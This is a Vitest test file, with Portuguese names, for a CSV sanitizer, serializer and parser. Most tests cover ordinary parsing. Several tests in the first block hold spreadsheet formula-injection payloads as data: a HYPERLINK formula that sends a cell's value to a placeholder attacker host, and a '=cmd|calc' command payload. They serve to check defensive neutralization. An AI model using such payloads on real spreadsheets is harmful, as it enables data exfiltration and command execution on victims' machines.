import { describe, expect, it } from 'vitest';
import { deCsv, paraCsv, sanitizeCsvCell } from './csv';

describe('sanitizeCsvCell — injeção de fórmula', () => {
  it('neutraliza os cinco prefixos perigosos', () => {
    expect(sanitizeCsvCell('=1+1')).toBe("'=1+1");
    expect(sanitizeCsvCell('+1')).toBe("'+1");
    expect(sanitizeCsvCell('-1')).toBe("'-1");
    expect(sanitizeCsvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(sanitizeCsvCell('\tinjecao')).toBe("'\tinjecao");
  });

  it('neutraliza o ataque clássico de exfiltração via HYPERLINK', () => {
    const ataque = '=HYPERLINK("http://atacante/"&A1,"clique aqui")';
    expect(sanitizeCsvCell(ataque)).toBe(`'${ataque}`);
  });

  it('não altera texto legítimo', () => {
    expect(sanitizeCsvCell('Transportes Serra Azul')).toBe('Transportes Serra Azul');
    expect(sanitizeCsvCell('1500')).toBe('1500');
    expect(sanitizeCsvCell('')).toBe('');
  });

  it('é aplicado em toda exportação CSV', () => {
    const csv = paraCsv([{ observacoes: '=cmd|calc' }]);
    expect(csv).toContain("'=cmd|calc");
  });
});

describe('paraCsv', () => {
  it('escapa aspas duplicando-as', () => {
    const csv = paraCsv([{ nome: 'Empresa "Alfa"' }]);
    expect(csv).toContain('"Empresa ""Alfa"""');
  });

  it('envolve campos com vírgula ou quebra de linha', () => {
    expect(paraCsv([{ obs: 'a,b' }])).toContain('"a,b"');
    expect(paraCsv([{ obs: 'linha1\nlinha2' }])).toContain('"linha1\nlinha2"');
  });

  it('emite null e undefined como vazio, não como a string "null"', () => {
    const csv = paraCsv([{ a: null, b: undefined, c: 0 }]);
    expect(csv).toContain(',,0');
  });

  it('gera apenas o cabeçalho para lista vazia com colunas declaradas', () => {
    expect(paraCsv([], ['id', 'nome'])).toBe('id,nome\n');
  });
});

describe('deCsv', () => {
  it('lê um CSV simples', () => {
    const r = deCsv('id,nome\n1,Alfa\n2,Beta\n');
    expect(r.cabecalho).toEqual(['id', 'nome']);
    expect(r.linhas).toHaveLength(2);
    expect(r.linhas[0].valores).toEqual({ id: '1', nome: 'Alfa' });
  });

  it('numera as linhas contando o cabeçalho como linha 1', () => {
    const r = deCsv('id\n1\n2\n');
    expect(r.linhas[0].numero).toBe(2);
    expect(r.linhas[1].numero).toBe(3);
  });

  it('respeita separador dentro de aspas', () => {
    const r = deCsv('id,obs\n1,"a,b"\n');
    expect(r.linhas[0].valores.obs).toBe('a,b');
  });

  it('respeita quebra de linha dentro de aspas', () => {
    const r = deCsv('id,obs\n1,"linha1\nlinha2"\n');
    expect(r.linhas).toHaveLength(1);
    expect(r.linhas[0].valores.obs).toBe('linha1\nlinha2');
  });

  it('interpreta aspas escapadas', () => {
    const r = deCsv('id,nome\n1,"Empresa ""Alfa"""\n');
    expect(r.linhas[0].valores.nome).toBe('Empresa "Alfa"');
  });

  it('aceita ponto e vírgula, comum em CSV brasileiro de ERP', () => {
    const r = deCsv('id;nome\n1;Alfa\n');
    expect(r.linhas[0].valores.nome).toBe('Alfa');
  });

  it('remove BOM de arquivos exportados no Windows', () => {
    const r = deCsv('﻿id,nome\n1,Alfa\n');
    expect(r.cabecalho[0]).toBe('id');
  });

  it('reporta linha com número errado de colunas em vez de aceitar dado torto', () => {
    const r = deCsv('id,nome,cidade\n1,Alfa\n2,Beta,Campinas\n');
    expect(r.linhas).toHaveLength(1);
    expect(r.linhasMalformadas).toHaveLength(1);
    expect(r.linhasMalformadas[0].numero).toBe(2);
  });

  it('lida com CRLF', () => {
    const r = deCsv('id,nome\r\n1,Alfa\r\n');
    expect(r.linhas).toHaveLength(1);
    expect(r.linhas[0].valores.nome).toBe('Alfa');
  });

  it('não quebra com entrada vazia', () => {
    const r = deCsv('');
    expect(r.linhas).toHaveLength(0);
    expect(r.cabecalho).toHaveLength(0);
  });

  it('ignora linhas em branco no fim do arquivo', () => {
    const r = deCsv('id\n1\n\n\n');
    expect(r.linhas).toHaveLength(1);
  });

  it('faz round-trip com o serializador', () => {
    const original = [
      { id: '1', nome: 'Empresa "Alfa"', obs: 'a,b' },
      { id: '2', nome: 'Beta', obs: 'linha1\nlinha2' },
    ];
    const lido = deCsv(paraCsv(original));
    expect(lido.linhas).toHaveLength(2);
    expect(lido.linhas[0].valores.nome).toBe('Empresa "Alfa"');
    expect(lido.linhas[1].valores.obs).toBe('linha1\nlinha2');
  });
});
